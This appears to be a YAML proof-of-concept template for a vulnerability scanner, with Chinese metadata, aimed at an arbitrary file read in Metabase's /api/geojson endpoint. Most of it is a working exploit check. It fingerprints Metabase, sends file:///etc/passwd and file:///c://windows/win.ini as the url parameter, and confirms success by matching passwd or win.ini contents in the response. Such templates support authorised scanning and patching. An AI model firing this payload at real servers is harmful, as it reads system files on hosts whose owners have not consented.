id: poc-yaml-metabase-any-fileread
info:
  name: Metabase geojson接口存在任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: metabase
  fofa: app="Metabase"
variables:
  data: 'file:///etc/passwd

    file:///c://windows/win.ini'
firstRequest:
  method: GET
  path: /
  expression: "status_code == 200 && \ncontains(body,\"metabase\")\n"
requests:
- method: GET
  path: /api/geojson?url={{.data}}
  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
    \ \"root:.*:0:0:\")\n)\n"
transport: http
